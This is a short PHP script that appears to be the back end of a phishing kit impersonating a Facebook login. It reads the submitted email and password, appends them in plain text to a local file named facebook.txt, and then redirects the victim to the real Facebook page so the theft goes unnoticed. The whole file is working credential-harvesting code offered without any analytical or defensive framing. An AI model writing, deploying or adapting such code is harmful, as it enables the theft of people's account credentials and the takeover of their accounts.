<?php
$email = $_POST['email'];
$password = $_POST['password'];

$file = fopen("../data/facebook.txt", "a");
fwrite($file, "Email: $email\nPassword: $password\n\n");
fclose($file);

// Redirect to the real Facebook login page
header("Location: https://facebook.com");
exit();
?>